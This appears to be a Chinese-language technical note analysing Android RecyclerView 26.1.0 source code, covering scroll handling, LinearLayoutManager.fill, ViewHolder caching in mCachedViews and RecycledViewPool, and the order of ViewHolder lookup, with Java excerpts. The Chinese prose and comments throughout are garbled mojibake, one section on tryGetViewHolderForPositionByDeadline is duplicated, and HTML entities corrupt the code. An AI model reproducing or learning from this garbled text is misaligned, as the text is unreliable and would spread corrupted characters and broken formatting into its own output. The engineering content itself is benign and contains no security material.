ä¸ºä¸‹ä¸€å¸§å¹¶æœªå¼€å§‹ã€‚çœŸæ­£çš„æ‰§è¡Œscrollæ“ä½œéœ€è¦ç­‰åˆ°nextFrameæ‰§è¡Œåæ‰èƒ½ç”Ÿæ•ˆï¼Œå…·ä½“ä¸€ç‚¹çš„è¯ï¼Œå°±æ˜¯ä¸‹ä¸€ä¸ªæ‰§è¡Œlayoutçš„messageçš„callbackè¿˜æœªè¢«æ‰§è¡Œã€‚// åˆä¾‹å¦‚ï¼Œåœ¨onCreateä¸­è°ƒç”¨recyclerView.scrollToPosition(15);//åœ¨netWorkCallbackä¸­è°ƒç”¨setAdapterï¼Œè¿™æ—¶recyclerViewä¼šåˆ©ç”¨pendingçš„15 positionã€‚åŸå› åœ¨äºrecyclerViewä¼šåˆ¤æ–­å¦‚æœlayoutManagerå’Œadapteræ˜¯å¦ä¸ºnullï¼Œå¦‚æœéƒ½ä¸ºnullã€‚skip layoutã€‚ // - åœ¨getItemViewTypeä¸­è¿”å›R.layout.itemLayoutçš„å¥½å¤„ã€‚onCreateViewHolder(ViewGroup viewParent,int ViewType) { View itemView = inflate.inflate(ViewType,parent,false); return XXXHolder(itemView);//aaptå¯ä»¥ç¡®ä¿R.layout.xxxxæ˜¯uniqueçš„ã€‚} - ClickListenerçš„å®ç° åœ¨onCreateViewHolderä¸­ä¼ ä¸€ä¸ªcallbackï¼Œä¸è¦åœ¨onBindViewHolderä¸­ä¼ ï¼Œä¸è¦æŠŠonBindViewHolderä¸­çš„positionå˜ä¸ºfinalçš„ã€‚getAdapterPositonå¯èƒ½ä¸ºNO_POSITION(-1)ï¼Œå› ä¸ºRecyclerViewçš„UIæ›´æ–°ä¼šè¢«deferåˆ°next Frameï¼Œåœ¨ä¸‹ä¸€å¸§æ›´æ–°è¢«æ‰§è¡Œå‰ï¼Œç”¨æˆ·å¯èƒ½å·²ç»ç‚¹å‡»äº†itemï¼Œè¿™æ—¶çš„positionå°±æœ‰å¯èƒ½æ˜¯-1(è¿™ç§æƒ…å†µå‘ç”Ÿåœ¨ç‚¹å‡»ååˆ é™¤äº†æ‰€æœ‰çš„itemæ•°æ®ï¼Œè¿™æ—¶è·å¾—çš„positionå°±ç±»ä¼¼äºlistçš„indexAtï¼Œå½“ç„¶æ˜¯-1ã€‚). - LayoutManageråªçŸ¥é“LayoutPositionï¼Œå¹¶ä¸çŸ¥é“AdapterPosition Itemsåœ¨Adapterçš„æ•°æ®é›†ä¸­çš„é¡ºåºå¯èƒ½ä¼šéšæ—¶å˜æ›´ï¼Œä½†recyclerViewå¯èƒ½å¹¶ä¸ä¼šè°ƒç”¨onBindViewHolderæ–¹æ³•ï¼Œè¿™ä¹Ÿå°±æ˜¯onBindViewHolderä¸­çš„positionå¹¶ä¸å¯é çš„åŸå› ã€‚å› ä¸ºviewHolderæœ¬èº«æ˜¯backed by Itemçš„ï¼Œè€ŒviewHolderçš„getAdapterPositionèƒ½å¤Ÿæ­£ç¡®åœ°ååº”Itemåœ¨æ•°æ®é›†ä¸­çš„é¡ºåºã€‚ ## 4.æ›´æ–° RecyclerView 26.1.0æºç æ‘˜å–éƒ¨åˆ†åˆ†æ ### 4.1 TouchEventçš„å¤„ç†é€»è¾‘ å…³äºRecyclerView çš„TouchEventçš„å¤„ç†é€»è¾‘ï¼š ç›´æ¥æ¥çœ‹onTouchEventä¸­çš„ACTION_MOVEçš„å¤„ç†å§ï¼š ```java if (mScrollState == SCROLL_STATE_DRAGGING) { mLastTouchX = x - mScrollOffset[0]; mLastTouchY = y - mScrollOffset[1]; if (scrollByInternal( canScrollHorizontally ? dx : 0, canScrollVertically ? dy : 0, vtev)) { getParent().requestDisallowInterceptTouchEvent(true); } if (mGapWorker != null &amp;&amp; (dx != 0 || dy != 0)) { mGapWorker.postFromTraversal(this, dx, dy); } } boolean scrollByInternal(int x, int y, MotionEvent ev) { int unconsumedX = 0, unconsumedY = 0; int consumedX = 0, consumedY = 0; consumePendingUpdateOperations(); if (mAdapter != null) { eatRequestLayout(); onEnterLayoutOrScroll(); TraceCompat.beginSection(TRACE_SCROLL_TAG); fillRemainingScrollValues(mState);//ä»viewFlingerçš„overScrollerä¸­æŸ¥è¯¢è¿˜å‰©å¤šå°‘distance,èµ‹å€¼ç»™mState if (x != 0) { consumedX = mLayout.scrollHorizontallyBy(x, mRecycler, mState); unconsumedX = x - consumedX; } if (y != 0) { consumedY = mLayout.scrollVerticallyBy(y, mRecycler, mState); unconsumedY = y - consumedY; // ä»¥scrollVerticallyByä¸ºä¾‹ï¼Œå†…éƒ¨è°ƒç”¨äº†scrollByæ–¹æ³•ã€‚ //è¿™é‡Œé¢åˆ†ä¸¤æ­¥ï¼Œä¸€ä¸ªæ˜¯fillï¼Œä¸€ä¸ªæ˜¯offsetChildrenVertical } TraceCompat.endSection(); repositionShadowingViews(); onExitLayoutOrScroll(); resumeRequestLayout(false); } if (!mItemDecorations.isEmpty()) { invalidate(); } if (dispatchNestedScroll(consumedX, consumedY, unconsumedX, unconsumedY, mScrollOffset, TYPE_TOUCH)) { // Update the last touch co-ords, taking any scroll offset into account mLastTouchX -= mScrollOffset[0]; mLastTouchY -= mScrollOffset[1]; if (ev != null) { ev.offsetLocation(mScrollOffset[0], mScrollOffset[1]); } mNestedOffsets[0] += mScrollOffset[0]; mNestedOffsets[1] += mScrollOffset[1]; } else if (getOverScrollMode() != View.OVER_SCROLL_NEVER) { if (ev != null &amp;&amp; !MotionEventCompat.isFromSource(ev, InputDevice.SOURCE_MOUSE)) { pullGlows(ev.getX(), unconsumedX, ev.getY(), unconsumedY); } considerReleasingGlowsOnScroll(x, y); } if (consumedX != 0 || consumedY != 0) { //é€šçŸ¥onScrollListneräº‹å®ä¸Šæ»‘åŠ¨äº†å¤šå°‘è·ç¦» dispatchOnScrolled(consumedX, consumedY); } if (!awakenScrollBars()) { invalidate(); } //åªè¦layoutmanageræ¶ˆè´¹çš„xå’Œyæœ‰ä¸€ä¸ªä¸ä¸º0ï¼Œå°±è¯·æ±‚requestDisallowInterceptTouchEvent. return consumedX != 0 || consumedY != 0; } åœ¨scrollByæ–¹æ³•ä¸­äº²æµ‹ï¼Œåœ¨ä¸€ä¸ªveticalLinearLayoutManagerä¸­ï¼Œæ‰‹æŒ‡å¾€ä¸Šèµ°çš„æ—¶å€™,dyæ˜¯&gt;0çš„ final int scrolled = absDy &gt; consumed ? layoutDirection * consumed : dy; //layoutDirectionåœ¨dy&gt;0æ—¶ä¸º1ï¼Œåœ¨dy&lt;0æ—¶ä¸º-1 //æ¯”å¦‚æ‰‹æŒ‡å¾€ä¸Šèµ°ï¼Œviewç…§ç†è¯´ä¹Ÿè¯¥å¾€ä¸Šèµ°ï¼Œå¦‚æœå®é™…æ¶ˆè´¹çš„ç§»åŠ¨è·ç¦»å°äºå¤–éƒ¨è¦æ±‚çš„ç§»åŠ¨è·ç¦»ç»å¯¹å€¼ï¼Œåˆ™ä½¿ç”¨æ¶ˆè´¹äº†çš„distanceã€‚æ‰€ä»¥RecyclerViewå®é™…æ¶ˆè´¹äº†çš„æ»‘åŠ¨è·ç¦»ï¼ˆä¹Ÿå°±æ˜¯åœ¨onScrollListenerä¸­è·å–åˆ°çš„è·ç¦»)å°±æ˜¯åœ¨è¿™é‡Œå†³å®šçš„ã€‚ //ä¸‹é¢è¿™ä¸ªscrolledå°±æ˜¯RecyclerViewä¸­æ‰€æœ‰childå®é™…ä¸Šæ»‘åŠ¨çš„è·ç¦»ã€‚ final int consumed = mLayoutState.mScrollingOffset + fill(recycler, mLayoutState, state, false); if (consumed &lt; 0) { if (DEBUG) { Log.d(TAG, &quot;Don&#39;t have any more elements to scroll&quot;); } return 0; } final int scrolled = absDy &gt; consumed ? layoutDirection * consumed : dy; mOrientationHelper.offsetChildren(-scrolled); //äº²æµ‹ï¼Œæ‰‹æŒ‡å¾€ä¸Šèµ°çš„æ—¶å€™ï¼Œè¿™ä¸ªscrolledæ˜¯&gt;0çš„ï¼Œä¹Ÿå°±æ˜¯ä¼ ç»™offsetChildrençš„å‚æ•°æ˜¯è´Ÿæ•°ï¼Œæ‰€ä»¥viewåœ¨è§†è§‰ä¸Šä¼šå¾€ä¸Šèµ°ã€‚è¿™é‡Œé¢ä¹Ÿæ˜¯å®é™…ä¸Šè°ƒç”¨äº†view.offsetTopAndBottomæ–¹æ³•ã€‚ å†çœ‹è¿™ä¸ªfillæ–¹æ³• int fill(RecyclerView.Recycler recycler, LayoutState layoutState, RecyclerView.State state, boolean stopOnFocusable) { // max offset we should set is mFastScroll + available final int start = layoutState.mAvailable; //æ‰‹æŒ‡å¾€ä¸Šèµ°çš„æ—¶å€™è¿™ä¸ªæ˜¯è´Ÿæ•° //å…³äºè¿™ä¸ªavailableï¼Œæ³¨é‡Šé‡Œè¯´çš„æ˜¯ Number of pixels that we should fill, in the layout direction. if (layoutState.mScrollingOffset != LayoutState.SCROLLING_OFFSET_NaN) { // TODO ugly bug fix. should not happen if (layoutState.mAvailable &lt; 0) { //æ‰‹æŒ‡å¾€ä¸Šèµ°çš„æ—¶å€™å› ä¸ºmAvailable&lt;0ä¼šèµ°åˆ°è¿™é‡Œ layoutState.mScrollingOffset += layoutState.mAvailable; // mScrollingOffsetçš„æ³¨é‡Šè¯´çš„æ˜¯ï¼šUsed when LayoutState is constructed in a scrolling state. // It should be set the amount of scrolling we can make without creating a new view. // Settings this is required for efficient view recycling. } recycleByLayoutState(recycler, layoutState); // è¿™é‡Œé¢å°±æ˜¯æ ¹æ®layoutStateçš„directionå¼€å§‹å›æ”¶view //æ¯”å¦‚æ‰‹æŒ‡å¾€ä¸Šèµ°ï¼Œå°±è°ƒç”¨recycleViewsFromStartï¼Œæ‰‹æŒ‡å¾€ä¸‹èµ°å°±è°ƒç”¨recycleViewsFromEndã€‚ä¹Ÿè¯´å¾—é€šï¼Œæ‰‹æŒ‡å¾€ä¸Šèµ°ï¼Œé¡¶éƒ¨çš„viewè¢«æ»‘å‡ºå±å¹•ï¼Œå½“ç„¶å¯ä»¥å¼€å§‹å›æ”¶æµç¨‹ } int remainingSpace = layoutState.mAvailable + layoutState.mExtra; LayoutChunkResult layoutChunkResult = mLayoutChunkResult; while ((layoutState.mInfinite || remainingSpace &gt; 0) &amp;&amp; layoutState.hasMore(state)) { layoutChunkResult.resetInternal(); if (VERBOSE_TRACING) { TraceCompat.beginSection(&quot;LLM LayoutChunk&quot;); } layoutChunk(recycler, state, layoutState, layoutChunkResult); //ä¸»è¦çš„å·¥ä½œå°±åœ¨layoutChunké‡Œé¢å®Œæˆ if (VERBOSE_TRACING) { TraceCompat.endSection(); } if (layoutChunkResult.mFinished) { break; } layoutState.mOffset += layoutChunkResult.mConsumed * layoutState.mLayoutDirection; /** * Consume the available space if: * * layoutChunk did not request to be ignored * * OR we are laying out scrap children * * OR we are not doing pre-layout */ if (!layoutChunkResult.mIgnoreConsumed || mLayoutState.mScrapList != null || !state.isPreLayout()) { layoutState.mAvailable -= layoutChunkResult.mConsumed; // we keep a separate remaining space because mAvailable is important for recycling remainingSpace -= layoutChunkResult.mConsumed; } if (layoutState.mScrollingOffset != LayoutState.SCROLLING_OFFSET_NaN) { layoutState.mScrollingOffset += layoutChunkResult.mConsumed; if (layoutState.mAvailable &lt; 0) { layoutState.mScrollingOffset += layoutState.mAvailable; } recycleByLayoutState(recycler, layoutState);//è¿™é‡Œæ˜¯å›æ”¶Viewçš„å…¥å£ } if (stopOnFocusable &amp;&amp; layoutChunkResult.mFocusable) { break; } } return start - layoutState.mAvailable; } æ‰“æ–­ç‚¹å‘ç°ï¼Œåœ¨scrollByçš„è¿‡ç¨‹ä¸­é€šè¿‡layoutChunkæ–¹æ³•ä¸€ç›´èµ°åˆ°Recycler.tryGetViewHolderForPositionByDeadline tryGetViewHolderForPositionByDeadlineæ–¹æ³•ç”¨äºè·å–ä¸€ä¸ªviewHolder // 0) If there is a changed scrap, try to find from there holder = getChangedScrapViewForPosition(position); // 1) Find by position from scrap/hidden list/cache holder = getScrapOrHiddenOrCachedHolderForPosition(position, dryRun); // 2) Find from scrap/cache via stable ids, if exists if (mAdapter.hasStableIds()) { holder = getScrapOrCachedViewForId(mAdapter.getItemId(offsetPosition), type, dryRun); } //è¿™ä¸­é—´è¿˜æœ‰ä¸€ä¸ª final View view = mViewCacheExtension.getViewForPositionAndType(this, position, type); // fallback to pool holder = getRecycledViewPool().getRecycledView(type); //last resort holder = mAdapter.createViewHolder(RecyclerView.this, type); ä»¥ä¸Šå³ä¸ºè·å–holderçš„ä¼˜å…ˆé¡ºåºï¼Œè·å–åˆ°holderä¹‹åå°±æ˜¯bindViewHolderäº† å›æ”¶è¿‡ç¨‹åœ¨LinearLayoutManagerçš„scrollBy -&gt; fill -&gt;recycleByLayoutState -&gt;recycleViewsFromStart(éå†children,ç¡®ä¿ç§»é™¤ä¸å¯è§çš„child)å¤„ç½®viewçš„é€»è¾‘åœ¨recycleViewHolderInternalä¸­é¦–å…ˆæ˜¯å°è¯•mCachedViewsï¼ˆ ArrayListï¼Œé»˜è®¤æœ€å¤§mViewCacheMax = 2ï¼Œå®é™…debugä¸­æ˜¯3ï¼‰ // Retire oldest cached view int cachedViewSize = mCachedViews.size(); if (cachedViewSize &gt;= mViewCacheMax &amp;&amp; cachedViewSize &gt; 0) { recycleCachedViewAt(0); // å°†listä¸­ç¬¬ä¸€ä¸ªviewHolderè¸¢åˆ°Pool -&gt;è¿™é‡Œé¢è°ƒç”¨äº†addViewHolderToRecycledViewPool cachedViewSize--; } // è¿™ä¹‹åå°†æ–°æ¥çš„è¿™ä¸ªholderåŠ åˆ°listçš„å°¾éƒ¨ï¼Œç°åœ¨çœ‹æ¥å°±æ˜¯3 //æ¥ä¸‹æ¥åº”è¯¥æ˜¯ä»recyclerViewPoolä¸­æ ¹æ®å¯¹åº”çš„ç±»å‹æ‰¾åˆ°åˆé€‚çš„ScrapHeapï¼Œæ·»åŠ è¿›å»ã€‚ç›®å‰çœ‹æ¥ï¼Œpoolå°±æ˜¯æ ¹æ®ä¸åŒçš„viewTypeç»´æŒäº†ä¸åŒçš„ArrayList&lt;ViewHolder&gt;, viewè¢«recycleçš„æ—¶å€™æ˜¯å¦å¯ä»¥å»ç§»é™¤å¯¹åº”çš„Viewä¸­ImageViewçš„drawable?ç­”æ¡ˆæ˜¯ä¸èƒ½äº²æµ‹ä¸‹æ¥ï¼Œåœ¨onViewDetachedFromWindowä¸­å»setImageDrawable(null)çš„è¯ã€‚æ‰‹æŒ‡æ…¢æ…¢å°†ä¸€ä¸ªImageViewæ»‘å‡ºå±å¹•ï¼Œç„¶åå†æ»‘å›æ¥çš„è¯ã€‚è¿™ä¸ªImageViewçš„èƒŒæ™¯å°±æ²¡æœ‰äº†ã€‚æ˜¾ç„¶è¿™ä¸ªè¿‡ç¨‹ä¸­æ²¡æœ‰é‡æ–°å»èµ°onBindViewHolderæ–¹æ³•ã€‚ä½†æ˜¯æ»‘åŠ¨å‡ºå±å¹•ç¡®å®è°ƒç”¨åˆ°äº†mAdapter.onViewDetachedFromWindow(viewHolder)æ–¹æ³•ã€‚ é‚£ä¹ˆdetachä¸‹æ¥çš„Viewè¢«ä¸¢åˆ°å“ªé‡Œäº†ï¼Ÿ ä»æºç æ¥çœ‹ï¼šæ•´ä¸ªçš„è°ƒç”¨æµç¨‹åº”è¯¥æ˜¯è¿™æ ·çš„ï¼šRecyclerView.onTouchEvent -&gt; RecyclerView.scrollByInternal -&gt; RecyclerView.scrollVerticallyBy -&gt; LinearLayoutManager.scrollBy -&gt; LinearLayoutManager.fill -&gt; LinearLayoutManger.recycleByLayoutSate -&gt;LinearLayoutManager.recycleViewFromStart -&gt; LinearLayoutManager.recycleChildren -&gt;LayoutManager.removeAndRecycleViewAt(index,recycler) public void removeAndRecycleViewAt(int index, Recycler recycler) { final View view = getChildAt(index); removeViewAt(index); recycler.recycleView(view); } removeViewAtæ–¹æ³•é•¿è¿™æ ·ï¼š @Override public void removeViewAt(int index) { final View child = RecyclerView.this.getChildAt(index); if (child != null) { dispatchChildDetached(child); // Clear any android.view.animation.Animation that may prevent the item from // detaching when being removed. If a child is re-added before the // lazy detach occurs, it will receive invalid attach/detach sequencing. child.clearAnimation(); } if (VERBOSE_TRACING) { TraceCompat.beginSection(&quot;RV removeViewAt&quot;); } RecyclerView.this.removeViewAt(index); //è¿™ä¸€æ­¥æ‰§è¡Œå®Œ,getParent() =null if (VERBOSE_TRACING) { TraceCompat.endSection(); } } è€ŒdispatchChildDetachedæ˜¯åœ¨parent.removeChildä¹‹å‰è°ƒç”¨çš„ void dispatchChildDetached(View child) { final ViewHolder viewHolder = getChildViewHolderInt(child); onChildDetachedFromWindow(child); if (mAdapter != null &amp;&amp; viewHolder != null) { mAdapter.onViewDetachedFromWindow(viewHolder);// èµ°åˆ°è¿™é‡ŒgetParentè¿˜ä¸ä¼šä¸ºnull } if (mOnChildAttachStateListeners != null) { final int cnt = mOnChildAttachStateListeners.size(); for (int i = cnt - 1; i &gt;= 0; i--) { mOnChildAttachStateListeners.get(i).onChildViewDetachedFromWindow(child); } } } removeå®Œä¹‹åå°±æ˜¯recycler.recycleView(view)äº†ï¼Œå…·ä½“å®ç°åœ¨recycleViewHolderInternalé‡Œé¢.mCachedViews,viewCacheExtensionæˆ–è€…recyclerPoolä¸­ã€‚å…ˆçœ‹ä¸‹recyclerçš„å†…éƒ¨æˆå‘˜å˜é‡ç»“æ„ public final class Recycler { final ArrayList&lt;ViewHolder&gt; mAttachedScrap = new ArrayList&lt;&gt;(); ArrayList&lt;ViewHolder&gt; mChangedScrap = null; final ArrayList&lt;ViewHolder&gt; mCachedViews = new ArrayList&lt;ViewHolder&gt;(); private final List&lt;ViewHolder&gt; mUnmodifiableAttachedScrap = Collections.unmodifiableList(mAttachedScrap); private int mRequestedCacheMax = DEFAULT_CACHE_SIZE; int mViewCacheMax = DEFAULT_CACHE_SIZE; RecycledViewPool mRecyclerPool; private ViewCacheExtension mViewCacheExtension; static final int DEFAULT_CACHE_SIZE = 2; //.... ä¸‹é¢å°±æ˜¯ä¸€äº›methodäº†ï¼Œå¯ä»¥çœ‹åˆ°ç¼“å­˜å…¨éƒ¨éƒ½æ˜¯ä»¥ViewHolderä¸ºå•ä½çš„ } Recycler.recycleViewHolderInternal(ViewHolder holder) /** * internal implementation checks if view is scrapped or attached and throws an exception * if so. * Public version un-scraps before calling recycle. */ void recycleViewHolderInternal(ViewHolder holder) { if (holder.isScrap() || holder.itemView.getParent() != null) { //ä»è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œåˆ°äº†è¿™ä¸ªæ—¶å€™,parentå·²ç»ä¸ºnulläº† throw new IllegalArgumentException( &quot;Scrapped or attached views may not be recycled. isScrap:&quot; + holder.isScrap() + &quot; isAttached:&quot; + (holder.itemView.getParent() != null) + exceptionLabel()); } if (holder.isTmpDetached()) { throw new IllegalArgumentException(&quot;Tmp detached view should be removed &quot; + &quot;from RecyclerView before it can be recycled: &quot; + holder + exceptionLabel()); } if (holder.shouldIgnore()) { throw new IllegalArgumentException(&quot;Trying to recycle an ignored view holder. You&quot; + &quot; should first call stopIgnoringView(view) before calling recycle.&quot; + exceptionLabel()); } //ä¸Šé¢è¿™äº›exceptionå°±ä¸çœ‹äº† //noinspection unchecked final boolean transientStatePreventsRecycling = holder .doesTransientStatePreventRecycling(); final boolean forceRecycle = mAdapter != null &amp;&amp; transientStatePreventsRecycling &amp;&amp; mAdapter.onFailedToRecycleView(holder); //onFailedToRecycleViewå°±æ˜¯åœ¨è¿™ä¸ªæ—¶å€™è°ƒç”¨åˆ°çš„ boolean cached = false; boolean recycled = false; if (DEBUG &amp;&amp; mCachedViews.contains(holder)) { throw new IllegalArgumentException(&quot;cached view received recycle internal? &quot; + holder + exceptionLabel()); } //å¼ºè°ƒä¸€ä¸‹ï¼Œèµ°åˆ°è¿™é‡Œï¼Œview.getParent() = null if (forceRecycle || holder.isRecyclable()) { //forceRecycle åˆ°è¿™é‡Œæ˜¯false if (mViewCacheMax &gt; 0 //ä»€ä¹ˆéƒ½ä¸åšçš„è¯ï¼ŒmViewCacheMax=3 &amp;&amp; !holder.hasAnyOfTheFlags(ViewHolder.FLAG_INVALID | ViewHolder.FLAG_REMOVED | ViewHolder.FLAG_UPDATE | ViewHolder.FLAG_ADAPTER_POSITION_UNKNOWN)) { // Retire oldest cached view int cachedViewSize = mCachedViews.size();//ä»€ä¹ˆéƒ½ä¸åšçš„è¯ï¼Œè¿™é‡Œæ˜¯3 if (cachedViewSize &gt;= mViewCacheMax &amp;&amp; cachedViewSize &gt; 0) { //è¿™é‡Œå…¶å®å°±æ˜¯mCachedViewså·²ç»æ»¡äº† recycleCachedViewAt(0); //å› ä¸ºæ˜¯ä¸€ä¸ªArrayList,åœ¨å·²ç»æ»¡äº†çš„æƒ…å†µä¸‹ï¼Œç›´æ¥æŠŠæœ€è€çš„ï¼ˆç¬¬ä¸€ä¸ªï¼‰åˆ æ‰ cachedViewSize--; } int targetCacheIndex = cachedViewSize; if (ALLOW_THREAD_GAP_WORK &amp;&amp; cachedViewSize &gt; 0 &amp;&amp; !mPrefetchRegistry.lastPrefetchIncludedPosition(holder.mPosition)) { // when adding the view, skip past most recently prefetched views int cacheIndex = cachedViewSize - 1; while (cacheIndex &gt;= 0) { int cachedPos = mCachedViews.get(cacheIndex).mPosition; if (!mPrefetchRegistry.lastPrefetchIncludedPosition(cachedPos)) { break; } cacheIndex--; } targetCacheIndex = cacheIndex + 1; } mCachedViews.add(targetCacheIndex, holder);//åˆšæ‰ä¸æ˜¯æŠŠç¬¬ä¸€ä¸ªä½ç½®çš„holderä»mCachedViewsä¸­åˆ é™¤æ‰äº†å—ï¼Œç°åœ¨å°±å¯ä»¥æŠŠæ–°æ¥çš„è¿™ä¸ªholderåŠ è¿›å»äº†ã€‚ cached = true; } if (!cached) { addViewHolderToRecycledViewPool(holder, true); recycled = true; } } else { // NOTE: A view can fail to be recycled when it is scrolled off while an animation // runs. In this case, the item is eventually recycled by // ItemAnimatorRestoreListener#onAnimationFinished. // TODO: consider cancelling an animation when an item is removed scrollBy, // to return it to the pool faster if (DEBUG) { Log.d(TAG, &quot;trying to recycle a non-recycleable holder. Hopefully, it will &quot; + &quot;re-visit here. We are still removing it from animation lists&quot; + exceptionLabel()); } } // even if the holder is not removed, we still call this method so that it is removed // from view holder lists. mViewInfoStore.removeViewHolder(holder); if (!cached &amp;&amp; !recycled &amp;&amp; transientStatePreventsRecycling) { holder.mOwnerRecyclerView = null; } } recycleCachedViewAtè¿™ä¸ªæ–¹æ³•é‡Œé¢ void recycleCachedViewAt(int cachedViewIndex) { if (DEBUG) { Log.d(TAG, &quot;Recycling cached view at index &quot; + cachedViewIndex); } ViewHolder viewHolder = mCachedViews.get(cachedViewIndex); if (DEBUG) { Log.d(TAG, &quot;CachedViewHolder to be recycled: &quot; + viewHolder); } addViewHolderToRecycledViewPool(viewHolder, true); mCachedViews.remove(cachedViewIndex); //ä¸¢è¿›recyelcerPoolçš„viewHolderå°±å¯ä»¥ä»mCachedViewä¸­æŒªæ‰äº† } /** * Prepares the ViewHolder to be removed/recycled, and inserts it into the RecycledViewPool. * * Pass false to dispatchRecycled for views that have not been bound. * * @param holder Holder to be added to the pool. * @param dispatchRecycled True to dispatch View recycled callbacks. */ void addViewHolderToRecycledViewPool(ViewHolder holder, boolean dispatchRecycled) { clearNestedRecyclerViewIfNotNested(holder); if (holder.hasAnyOfTheFlags(ViewHolder.FLAG_SET_A11Y_ITEM_DELEGATE)) { holder.setFlags(0, ViewHolder.FLAG_SET_A11Y_ITEM_DELEGATE); ViewCompat.setAccessibilityDelegate(holder.itemView, null); } if (dispatchRecycled) { dispatchViewRecycled(holder);// mRecyclerListener.onViewRecycled(holder); mAdapter.onViewRecycled(holder);è¿™äº›æ–¹æ³• } holder.mOwnerRecyclerView = null; //æ¥ä¸‹æ¥å¼€å§‹ä¸¢åˆ°recyclerPoolä¸­ getRecycledViewPool().putRecycledView(holder); } recyclerpoolä¸­çš„æˆå‘˜å˜é‡å¦‚ä¸‹: */ public static class RecycledViewPool { private static final int DEFAULT_MAX_SCRAP = 5; /** * Tracks both pooled holders, as well as create/bind timing metadata for the given type. * * Note that this tracks running averages of create/bind time across all RecyclerViews * (and, indirectly, Adapters) that use this pool. * * 1) This enables us to track average create and bind times across multiple adapters. Even * though create (and especially bind) may behave differently for different Adapter * subclasses, sharing the pool is a strong signal that they&#39;ll perform similarly, per type. * * 2) If {@link #willBindInTime(int, long, long)} returns false for one view, it will return * false for all other views of its type for the same deadline. This prevents items * constructed by {@link GapWorker} prefetch from being bound to a lower priority prefetch. */ static class ScrapData { ArrayList&lt;ViewHolder&gt; mScrapHeap = new ArrayList&lt;&gt;(); int mMaxScrap = DEFAULT_MAX_SCRAP; long mCreateRunningAverageNs = 0; //è¿™ä¸ªæ˜¯ä¸ºprefetcherå‡†å¤‡çš„ï¼Œprefetcherä¼šæ ¹æ®è¿™ç§viewTypeçš„Holderçš„å¹³å‡bindViewHolderæ—¶é—´æ¨æ–­æ˜¯å¦èƒ½å¤Ÿåœ¨ä¸‹ä¸€ä¸ªFrameå‰å®Œæˆbindæ“ä½œ long mBindRunningAverageNs = 0; } SparseArray&lt;ScrapData&gt; mScrap = new SparseArray&lt;&gt;(); private int mAttachCount = 0; } æ‰€ä»¥æ•´ä¸ªRecyclerPoolçš„ç¼“å­˜å°±æ˜¯ä¸€ä¸ªSparseArrayï¼ŒViewTypeä½œä¸ºkeyï¼Œä¸€ä¸ªArrayListä½œä¸ºvalueã€‚æ¯ç§ç±»å‹çš„viewHolderéƒ½ç»´æŒäº†ä¸€ä¸ªArrayListï¼Œé»˜è®¤ArrayListçš„æœ€å¤§å®¹é‡ä¸º5ã€‚ æ‰€ä»¥æ•´ä¸ªç¼“å­˜ç»“æ„å°±æ˜¯ä¸‰å±‚ã€‚mCachedViewsï¼ˆList)æ˜¯ä¸€å±‚ï¼ŒrecyclerPoolä¸­çš„sparseArrayæ˜¯ç¬¬ä¸‰å±‚ï¼Œä¸­é—´è¿˜æœ‰ä¸€ä¸ªViewCacheExtensionéœ€è¦ç”¨æˆ·è‡ªå®šä¹‰ï¼Œä¸è¿‡åªéœ€è¦é‡å†™getViewForPositionAndTypeè¿™ä¸€ä¸ªæ–¹æ³•å°±è¡Œã€‚ å›æ”¶viewçš„è¿‡ç¨‹åˆ°æ­¤ç»“æŸï¼Œå†åˆ©ç”¨çš„è¿‡ç¨‹å‘¢? GapWorker.run -&gt; GapWorker.prefetch -&gt; GapWorker.flushTasksWithDeadLine -&gt; GapWorker.flushTaskWithDeadLine -&gt; GapWorker.prefetchPositionWithDeadLine -&gt; Recycler.tryGetViewHolderForPositionByDeadline æ‰“æ–­ç‚¹å‘ç°ï¼Œåœ¨scrollByçš„è¿‡ç¨‹ä¸­é€šè¿‡layoutChunkæ–¹æ³•ä¸€ç›´èµ°åˆ°Recycler.tryGetViewHolderForPositionByDeadline tryGetViewHolderForPositionByDeadlineæ–¹æ³•ç”¨äºè·å–ä¸€ä¸ªviewHolder`java// 0) If there is a changed scrap, try to find from thereholder = getChangedScrapViewForPosition(position);// 1) Find by position from scrap/hidden list/cacheholder = getScrapOrHiddenOrCachedHolderForPosition(position, dryRun);// 2) Find from scrap/cache via stable ids, if existsif (mAdapter.hasStableIds()) { holder = getScrapOrCachedViewForId(mAdapter.getItemId(offsetPosition), type, dryRun);}//è¿™ä¸­é—´è¿˜æœ‰ä¸€ä¸ªfinal View view = mViewCacheExtension.getViewForPositionAndType(this, position, type); // fallback to poolholder = getRecycledViewPool().getRecycledView(type); //last resortholder = mAdapter.createViewHolder(RecyclerView.this, type); ä»¥ä¸Šå³ä¸ºè·å–holderçš„ä¼˜å…ˆé¡ºåºï¼Œè·å–åˆ°holderä¹‹åå°±æ˜¯bindViewHolderäº† æ¥ä¸‹æ¥çœ‹è·å¾—åˆ°holderä¹‹åï¼Œæ— è®ºæ˜¯ä»mCachedViewsè¿˜æ˜¯recyclerpoolä¸­è·å¾—çš„holderï¼Œä¸‹é¢å†³å®šæ˜¯å¦éœ€è¦ç»‘å®š ```java boolean bound = false; if (mState.isPreLayout() &amp;&amp; holder.isBound()) { //å¦‚æœå·²ç»è°ƒç”¨è¿‡BindViewHolderæ–¹æ³•ï¼Œå°±ä¸å†å»onBindViewHolderäº†ã€‚è€Œæ˜¯ç›´æ¥å°†è¿™ä¸ªviewholderçš„itemViewè¿”å›ç»™getViewPositionå‡½æ•° // do not update unless we absolutely have to. holder.mPreLayoutPosition = position; } else if (!holder.isBound() || holder.needsUpdate() || holder.isInvalid()) { if (DEBUG &amp;&amp; holder.isRemoved()) { throw new IllegalStateException(&quot;Removed holder should be bound and it should&quot; + &quot; come here only in pre-layout. Holder: &quot; + holder + exceptionLabel()); } final int offsetPosition = mAdapterHelper.findPositionOffset(position); bound = tryBindViewHolderByDeadline(holder, offsetPosition, position, deadlineNs);// è¿™æ˜¯å”¯ä¸€çš„onBindViewHolderä¼šè¢«è°ƒç”¨åˆ°çš„åœ°æ–¹ } mAttachedScrapæ˜¯ä¸€ä¸ªArrayListï¼Œåœ¨RecyclerViewçš„dispatchLayoutStep2ä¸­ä¼šèµ°åˆ°ï¼ŒLayoutManagerçš„onLayoutChildrenä¸­ä¼šè°ƒç”¨ detachAndScrapAttachedViews(recycler)è¿™ä¸ªæ–¹æ³•ï¼Œå…¶å®å°±æ˜¯å°†å½“å‰RecyclerViewçš„æ‰€æœ‰childä»åå¾€å‰æ·»åŠ åˆ°è¿™ä¸ªmAttachedScrapä¸­ã€‚ 